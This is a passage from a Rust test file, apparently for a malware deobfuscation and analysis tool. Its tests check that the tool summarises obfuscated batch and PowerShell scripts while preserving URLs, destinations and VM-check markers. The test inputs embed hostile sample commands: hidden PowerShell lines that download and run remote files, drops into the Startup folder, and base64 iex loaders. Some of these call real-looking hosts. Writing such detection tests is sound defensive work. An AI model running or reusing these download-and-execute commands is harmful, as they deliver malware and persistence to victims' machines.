+            !cleaned.contains("cmd.exe /c echo function Stage"),
+            "raw cmd echo wrapper leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains(normalized),
+            "normalized pipeline was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn combined_opaque_and_percent_noise_uses_fully_summarized_drive_input() {
+        let opaque_payload = format!("{}#@{}", "A".repeat(160 * 1024), "B".repeat(160 * 1024));
+        let mut percent_noise_line = String::new();
+        for idx in 0..96 {
+            percent_noise_line.push('%');
+            percent_noise_line.push_str(&format!("DeadCarrierVar{idx:02}"));
+            percent_noise_line.push_str(&"ZzYyXxWw".repeat(8));
+        }
+        percent_noise_line.push_str("%:%\"QEMU HARDDISK\"%");
+
+        let mut script = format!("@echo off\r\n{opaque_payload}\r\n");
+        for _ in 0..220 {
+            script.push_str(&percent_noise_line);
+            script.push_str("\r\n");
+        }
+        script.push_str("echo after\r\n");
+
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 1,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "combined raw summaries still let drive burn the timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted 327682 opaque payload bytes"),
+            "opaque payload was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("long unresolved percent-noise lines"),
+            "percent-noise run was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("DeadCarrierVar00"),
+            "raw percent-noise leaked into deob output:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("echo after"),
+            "real command after summarized noise was not preserved:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn percent_noise_summary_preserves_materialized_powershell_pipeline() {
+        let command = "cmd.exe /c echo function Stage(){ [System.Reflection.Assembly]::Load([byte[]](1,2,3)) } | powershell.exe -NoProfile";
+        let mut environment = Vec::new();
+        let mut carrier = String::new();
+        for (idx, ch) in command.chars().enumerate() {
+            let name = format!("V{idx:03}");
+            environment.push((name.clone(), ch.to_string()));
+            carrier.push('%');
+            carrier.push_str(&name);
+            carrier.push('%');
+        }
+        for idx in command.len()..180 {
+            carrier.push('%');
+            carrier.push_str(&format!("NoiseVar{idx:03}"));
+            carrier.push('%');
+        }
+
+        let script = format!("@echo off\r\n{carrier}\r\necho after\r\n");
+        let report = crate::analyze_with_options(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 1,
+                ..Config::default()
+            },
+            &crate::AnalysisOptions::with_environment(environment),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "materialized percent-noise command burned the timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.extracted_ps1.is_empty(),
+            "decoded cmd-echo PowerShell pipeline was not extracted:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("cmd.exe /c echo function Stage"),
+            "decoded command was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("%V000%"),
+            "raw percent carrier leaked:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn long_unresolved_percent_noise_lines_are_summarized_with_vm_markers() {
+        let mut noisy = "NflNpVQP".repeat(160);
+        for idx in 0..24 {
+            noisy.push('%');
+            noisy.push_str(&format!("DeadCarrierVar{idx:02}"));
+            noisy.push_str(&"ZzYyXxWw".repeat(8));
+        }
+        noisy.push_str("%:%\"QEMU HARDDISK\"%:%\"VirtualBox\"%>junk.tmp");
+        let text = format!("@echo off\r\n{noisy}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_unresolved_percent_noise_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long unresolved percent-noise line"),
+            "long unresolved percent-noise line was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("QEMU HARDDISK") && cleaned.contains("VirtualBox"),
+            "VM markers were not preserved in summary:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("DeadCarrierVar00"),
+            "raw percent-noise variable names leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::AntiAnalysis { technique, target, .. }
+                    if technique == "vm-sandbox-check" && target == "VirtualBox"
+            )),
+            "VM marker summary did not emit AntiAnalysis trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn percent_noise_classifier_preserves_vm_markers() {
+        let mut noisy = "NflNpVQP".repeat(160);
+        for idx in 0..24 {
+            noisy.push('%');
+            noisy.push_str(&format!("DeadCarrierVar{idx:02}"));
+            noisy.push_str(&"ZzYyXxWw".repeat(8));
+        }
+        noisy.push_str("%:%\"QEMU HARDDISK\"%:%\"VirtualBox\"%>junk.tmp");
+
+        let summary = crate::classify_long_unresolved_percent_noise_line(&noisy)
+            .expect("percent-noise line should classify");
+
+        assert!(!summary.dense);
+        assert_eq!(summary.markers, vec!["QEMU HARDDISK", "VirtualBox", "QEMU"]);
+    }
+
+    #[test]
+    fn medium_percent_noise_lines_with_sparse_markers_are_summarized() {
+        let noisy = format!(
+            "%{}%{}%{}%{}%{}%{}",
+            "AlphaCarrierA".repeat(10),
+            "BetaCarrierB".repeat(10),
+            "GammaCarrierC".repeat(10),
+            "DeltaCarrierD".repeat(10),
+            "EpsilonCarrierE".repeat(10),
+            "ZetaCarrierF".repeat(10)
+        );
+        let text = format!("@echo off\r\n{noisy}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_unresolved_percent_noise_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long unresolved percent-noise line"),
+            "medium sparse percent-noise line was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn short_percent_noise_label_comment_lines_are_summarized() {
+        let text = concat!(
+            ":realLabel\r\n",
+            "echo before\r\n",
+            ":%noiseA%o%noiseB%p%noiseC%e%noiseD%n%noiseE%Pdf%noiseF%\r\n",
+            "echo after\r\n",
+        );
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_unresolved_percent_noise_lines(text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long unresolved percent-noise line"),
+            "short percent-noise label/comment line was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("%noiseA%"),
+            "raw percent-noise label/comment leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains(":realLabel")
+                && cleaned.contains("echo before")
+                && cleaned.contains("echo after"),
+            "real label or surrounding commands were dropped:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn adjacent_percent_noise_lines_are_aggregated() {
+        let mut text = String::from("@echo off\r\n");
+        for idx in 0..40 {
+            text.push_str(&format!(
+                "%Carrier{idx:02}%{}%{}%{}%{}%{}\r\n",
+                "AlphaBetaGamma".repeat(10),
+                "BetaGammaDelta".repeat(10),
+                "GammaDeltaEpsilon".repeat(10),
+                "DeltaEpsilonZeta".repeat(10),
+                "EpsilonZetaEta".repeat(10)
+            ));
+        }
+        text.push_str("echo after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_unresolved_percent_noise_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted 40 long unresolved percent-noise lines"),
+            "adjacent percent-noise lines were not aggregated:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("Carrier20"),
+            "raw percent-noise line leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+        assert_eq!(
+            env.traits
+                .iter()
+                .filter(|t| matches!(t, Trait::LineTruncated { .. }))
+                .count(),
+            1,
+            "expected one LineTruncated for the whole run: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn long_powershell_marker_base64_wrapper_lines_are_summarized() {
+        let marker = "wtghirpdtuue";
+        let b64 = "A".repeat(4096);
+        let line = format!(
+            "powershell.exe -nop -w h -c \"iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(('{b64}').Replace('{marker}',''))))\""
+        );
+        let text = format!("@echo off\r\n{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_powershell_marker_base64_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long PowerShell marker/base64 wrapper line"),
+            "long PowerShell wrapper was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("marker: wtghirpdtuue"),
+            "marker was not preserved in summary:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains(&b64[..512]),
+            "raw base64 leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn long_inline_powershell_command_lines_are_summarized_with_urls() {
+        let url = "https://mediterraneanfooddistributors.com.au/wp-admin/includ/Aktionists.ocx";
+        let line = format!(
+            "start /min powershell.exe -windowstyle hidden \"function Decode($s){{ $s }}; $wc=New-Object Net.WebClient; $wc.DownloadFile('{url}', $env:TEMP + '\\\\a.ocx'); {}\"",
+            "A".repeat(3600)
+        );
+        let text = format!("@echo off\r\n{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_inline_powershell_command_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long inline PowerShell command line"),
+            "long inline PowerShell command was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains(url),
+            "URL was not preserved in summary:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains(&"A".repeat(512)),
+            "raw filler leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn quoted_base64_fragment_line_runs_are_summarized() {
+        let text = [
+            "@echo off\r\n",
+            "\"iXPbROyjmuf==\"\r\n",
+            "\"vEJqgrbvMrc==\"\r\n",
+            "\"kUBQfEYJfWs==\"\r\n",
+            "\"vebSvbxcy==\"\r\n",
+            "\"AozaWDENZy==\"\r\n",
+            "\"xBCKGSlB==\"\r\n",
+            "\"KHUDdMXX==\"\r\n",
+            "\"PulsLgNu==\"\r\n",
+            "echo after\r\n",
+        ]
+        .concat();
+
+        let cleaned = crate::summarize_quoted_base64_fragment_line_runs(&text)
+            .expect("quoted base64 fragment run was not summarized");
+
+        assert!(
+            cleaned.contains("rem omitted 8 quoted base64 fragment lines"),
+            "quoted fragment run summary missing:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("iXPbROyjmuf"),
+            "raw quoted fragment leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("@echo off") && cleaned.contains("echo after"),
+            "surrounding commands were not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn medium_webrequest_powershell_boilerplate_is_summarized_with_url() {
+        let url = "https://mediafire.example/file/payload.rar/file";
+        let line = format!(
+            "powershell -Command \"& {{ $request = [System.Net.WebRequest]::Create('{url}'); $request.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/111.0.0.0 Safari/537.36'; $response = $request.GetResponse(); $responseStream = $response.GetResponseStream(); $fileStream = New-Object System.IO.FileStream('C:\\\\Temp\\\\stage.html', [System.IO.FileMode]::Create); [byte[]]$buffer = New-Object byte[] 1024; while(($bytesRead = $responseStream.Read($buffer, 0, $buffer.Length)) -gt 0) {{ $fileStream.Write($buffer, 0, $bytesRead); }} $fileStream.Close(); $responseStream.Close(); }}\""
+        );
+        let text = format!("{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_inline_powershell_command_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long inline PowerShell command line"),
+            "medium WebRequest boilerplate was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains(url),
+            "URL was not preserved in summary:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("C:\\\\Temp\\\\stage.html"),
+            "FileStream destination was not preserved in summary:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("GetResponseStream"),
+            "raw WebRequest boilerplate leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn medium_webrequest_powershell_boilerplate_preserves_symbolic_source_and_dst() {
+        let line = "powershell -Command \"& { $request = [System.Net.WebRequest]::Create('%%a'); $request.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/111.0.0.0 Safari/537.36'; $response = $request.GetResponse(); $responseStream = $response.GetResponseStream(); $fileStream = New-Object System.IO.FileStream('C:\\Temp\\playvideoa.a', [System.IO.FileMode]::Create); [byte[]]$buffer = New-Object byte[] 1024; while(($bytesRead = $responseStream.Read($buffer, 0, $buffer.Length)) -gt 0) { $fileStream.Write($buffer, 0, $bytesRead); } $fileStream.Close(); $responseStream.Close(); }\"";
+        let text = format!("{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_inline_powershell_command_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("source: %%a") && cleaned.contains("dst: C:\\Temp\\playvideoa.a"),
+            "symbolic source/destination were not preserved in summary:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("GetResponseStream"),
+            "raw WebRequest boilerplate leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn medium_webrequest_reader_boilerplate_preserves_symbolic_source() {
+        let line = "powershell -Command \"& { $request = [System.Net.WebRequest]::Create($env:url); $request.Method = 'GET'; $request.Referer = $env:referer; $request.UserAgent = $env:userAgent; $response = $request.GetResponse(); $stream = $response.GetResponseStream(); $reader = New-Object System.IO.StreamReader($stream); $content = $reader.ReadToEnd(); $reader.Close(); $response.Close(); }\"";
+        let text = format!("{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_inline_powershell_command_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long inline PowerShell command line"),
+            "medium WebRequest reader boilerplate was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("source: $env:url"),
+            "symbolic source was not preserved in summary:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("GetResponseStream") && !cleaned.contains("ReadToEnd"),
+            "raw WebRequest reader boilerplate leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn medium_cmd_wrapped_webclient_downloadfile_is_summarized_with_url_and_dst() {
+        let url = "http://config01.homepc.it/win/wget.exe";
+        let dst = "C:\\WINDOWS\\wget.exe";
+        let line = format!(
+            "C:\\WINDOWS\\System32\\cmd.exe /c powershell -command \"$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('{url}','{dst}')\""
+        );
+        let text = format!("{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_inline_powershell_command_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long inline PowerShell command line"),
+            "medium WebClient DownloadFile command was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains(url),
+            "URL was not preserved in summary:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains(dst),
+            "destination was not preserved in summary:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("User-Agent"),
+            "raw WebClient boilerplate leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn medium_invoke_webrequest_outfile_boilerplate_is_summarized_with_url_and_dst() {
+        let url = "https://usage-supposed-nurses-rica.trycloudflare.com/bab.zip";
+        let dst = "C:\\Users\\puncher\\Downloads\\downloaded.zip";
+        let line = format!(
+            "powershell -Command \"try {{ [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '{url}' -OutFile '{dst}' }} catch {{ exit 1 }}\""
+        );
+        let text = format!("{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_inline_powershell_command_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long inline PowerShell command line"),
+            "medium Invoke-WebRequest command was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains(url),
+            "URL was not preserved in summary:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains(dst),
+            "destination was not preserved in summary:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("SecurityProtocol"),
+            "raw Invoke-WebRequest boilerplate leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn standalone_empty_powershell_outfile_preview_is_summarized_in_deob_text() {
+        let empty_outfile_line = r#"powershell -Command "& { Invoke-WebRequest -Uri 'https://deob-empty-outfile.example/startup.bat' -OutFile '' }""#;
+        assert!(
+            crate::is_empty_powershell_outfile_preview_line(empty_outfile_line),
+            "empty OutFile detector missed exact preview line"
+        );
+
+        let script = br#"powershell -Command "& { Invoke-WebRequest -Uri 'https://deob-empty-outfile.example/startup.bat' -OutFile '' }"
+echo after
+"#;
+
+        let report = crate::analyze(script, &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted empty PowerShell file-argument preview"),
+            "empty OutFile duplicate should be summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("-OutFile ''"),
+            "empty OutFile preview leaked into deob text:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("echo after"),
+            "following command was not preserved:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn empty_powershell_outfile_preview_after_real_download_is_suppressed() {
+        let script = br#"set "cmdUrl=https://deob-empty-preview.example/startup.bat"
+set "cmdDestination=C:\Users\Public\startup.bat"
+powershell -Command "& { Invoke-WebRequest -Uri '%cmdUrl%' -OutFile '%cmdDestination%' }"
+powershell -Command "& { Invoke-WebRequest -Uri 'https://deob-empty-preview.example/startup.bat' -OutFile '' }"
+echo after
+"#;
+
+        let report = crate::analyze(script, &Config::default());
+
+        assert!(
+            !report
+                .deobfuscated
+                .contains("rem omitted empty PowerShell file-argument preview"),
+            "redundant empty OutFile preview polluted deob text:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("-OutFile ''"),
+            "empty OutFile preview leaked into deob text:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("echo after"),
+            "following command was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|trait_| matches!(
+                trait_,
+                Trait::Download { src, dst, .. }
+                    if src == "https://deob-empty-preview.example/startup.bat"
+                        && dst.as_deref() == Some(r"C:\Users\Public\startup.bat")
+            )),
+            "resolved structured download was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn empty_expand_archive_preview_is_summarized_in_deob_text() {
+        let script = br#"powershell -Command "try { Expand-Archive -Path '' -DestinationPath '' -Force } catch { exit 1 }"
+echo after
+"#;
+
+        let report = crate::analyze(script, &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted empty PowerShell file-argument preview"),
+            "empty Expand-Archive preview should be summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("Expand-Archive -Path ''"),
+            "empty Expand-Archive preview leaked into deob text:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("echo after"),
+            "following command was not preserved:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn compound_powershell_download_archive_execute_chain_is_split_without_hiding_actions() {
+        let line = "powershell.exe -WindowStyle Hidden -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://example.test/Document.zip', 'C:\\Users\\Public\\Document.zip')\";cmd /c powershell.exe -WindowStyle Hidden -Command Expand-Archive -Path \"C:\\Users\\Public\\Document.zip\" -DestinationPath \"C:/Users/Public/Document\";powershell.exe -WindowStyle Hidden -Command \"C:\\Users\\Public\\Document\\python C:\\Users\\Public\\Document\\Lib\\sim.py\"";
+
+        let report = crate::analyze(line.as_bytes(), &Config::default());
+        let lines: Vec<&str> = report.deobfuscated.lines().collect();
+
+        assert!(
+            lines.iter().any(|line| line.contains("DownloadFile")),
+            "download action was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            lines.iter().any(|line| line.contains("Expand-Archive")),
+            "archive extraction action was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            lines.iter().any(|line| line.contains("Document\\python")),
+            "execute action was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !lines
+                .iter()
+                .any(|line| line.contains("DownloadFile") && line.contains("Expand-Archive")),
+            "compound command chain was not split:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn quoted_powershell_download_archive_execute_chain_is_split_without_hiding_actions() {
+        let line = "start /min powershell.exe -WindowStyle Hidden -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://example.test/ud.bat', '%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WindowSafety.bat');[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://example.test/Document.zip', 'C:\\Users\\Public\\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document'); Start-Sleep -Seconds 1; C:\\Users\\Public\\Document\\python C:\\Users\\Public\\Document\\Lib\\sim.py; del C:/Users/Public/Document.zip\"";
+
+        let report = crate::analyze(line.as_bytes(), &Config::default());
+        let lines: Vec<&str> = report.deobfuscated.lines().collect();
+
+        assert!(
+            lines
+                .iter()
+                .filter(|line| line.contains("DownloadFile"))
+                .count()
+                >= 2,
+            "download actions were not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            lines.iter().any(|line| line.contains("ExtractToDirectory")),
+            "archive extraction action was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            lines.iter().any(|line| line.contains("Document\\python")),
+            "execute action was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !lines.iter().any(|line| {
+                line.contains("DownloadFile")
+                    && line.contains("ExtractToDirectory")
+                    && line.contains("Document\\python")
+            }),
+            "quoted compound PowerShell command was not split:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn direct_quoted_powershell_download_archive_execute_chain_is_split() {
+        let line = "powershell.exe -WindowStyle Hidden -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://example.test/Document.zip', 'C:\\\\Users\\\\Public\\\\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document'); Start-Sleep -Seconds 1; C:\\\\Users\\\\Public\\\\Document\\\\python.exe C:\\\\Users\\\\Public\\\\Document\\\\Lib\\\\sim.py; del C:/Users/Public/Document.zip\"";
+
+        let report = crate::analyze(line.as_bytes(), &Config::default());
+        let lines: Vec<&str> = report.deobfuscated.lines().collect();
+
+        assert!(
+            lines.iter().any(|line| line.contains("DownloadFile")),
+            "download action was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            lines.iter().any(|line| line.contains("ExtractToDirectory")),
+            "archive extraction action was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            lines.iter().any(|line| line.contains("python.exe")),
+            "execute action was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !lines.iter().any(|line| {
+                line.contains("DownloadFile")
+                    && line.contains("ExtractToDirectory")
+                    && line.contains("python.exe")
+            }),
+            "direct quoted PowerShell chain was not split:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn separator_rendered_quoted_powershell_chain_is_split_late() {
+        let line = "@echo off && start /min powershell.exe -WindowStyle Hidden -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://example.test/update1.bat', '%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WindowsSecure.bat')\";powershell.exe -WindowStyle Hidden -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://example.test/Document.zip', 'C:\\\\Users\\\\Public\\\\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document'); Start-Sleep -Seconds 1; C:\\\\Users\\\\Public\\\\Document\\\\python.exe C:\\\\Users\\\\Public\\\\Document\\\\Lib\\\\sim.py; del C:/Users/Public/Document.zip\" && exit";
+
+        let report = crate::analyze(line.as_bytes(), &Config::default());
+        let lines: Vec<&str> = report.deobfuscated.lines().collect();
+
+        assert!(
+            lines.iter().any(|line| line.contains("Document.zip")),
+            "download action was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            lines.iter().any(|line| line.contains("ExtractToDirectory")),
+            "archive extraction action was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            lines.iter().any(|line| line.contains("python.exe")),
+            "execute action was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !lines.iter().any(|line| {
+                line.contains("Document.zip")
+                    && line.contains("ExtractToDirectory")
+                    && line.contains("python.exe")
+            }),
+            "separator-rendered quoted PowerShell chain was not split:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn quoted_powershell_iwr_chain_is_split_into_individual_downloads() {
+        let line = "powershell -Command \"iwr 'https://example.test/koa/loa.py' -OutFile 'C:\\Users\\Public\\koa\\loa.py'; iwr 'https://example.test/koa/pa.bin' -OutFile 'C:\\Users\\Public\\koa\\pa.bin'; iwr 'https://example.test/koa/pa.txt' -OutFile 'C:\\Users\\Public\\koa\\pa.txt'; iwr 'https://example.test/koa/ggd.bin' -OutFile 'C:\\Users\\Public\\koa\\ggd.bin'; iwr 'https://example.test/koa/ggd.txt' -OutFile 'C:\\Users\\Public\\koa\\ggd.txt'; iwr 'https://example.test/koa/x6.bin' -OutFile 'C:\\Users\\Public\\koa\\x6.bin'; iwr 'https://example.test/koa/x6.txt' -OutFile 'C:\\Users\\Public\\koa\\x6.txt'\"";
+
+        let report = crate::analyze(line.as_bytes(), &Config::default());
+        let lines: Vec<&str> = report.deobfuscated.lines().collect();
+
+        assert!(
+            lines.iter().filter(|line| line.contains("iwr ")).count() >= 3,
+            "iwr actions were not preserved as separate lines:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !lines
+                .iter()
+                .any(|line| line.contains("loa.py") && line.contains("pa.bin")),
+            "quoted iwr chain was not split:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn quoted_powershell_iwr_archive_pair_is_split_below_long_line_gate() {
+        let line = "powershell -Command \"iwr 'https://example.test/python.zip' -OutFile 'C:\\Users\\Public\\p.zip'; Expand-Archive 'C:\\Users\\Public\\p.zip' 'C:\\Users\\Public\\py' -Force\"";
+
+        let report = crate::analyze(line.as_bytes(), &Config::default());
+        let lines: Vec<&str> = report.deobfuscated.lines().collect();
+
+        assert!(
+            lines.iter().any(|line| line.contains("iwr ")),
+            "download action was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            lines.iter().any(|line| line.contains("Expand-Archive")),
+            "archive action was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !lines
+                .iter()
+                .any(|line| line.contains("iwr ") && line.contains("Expand-Archive")),
+            "short iwr/archive pair was not split:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn malformed_quoted_powershell_iwr_process_chain_is_split() {
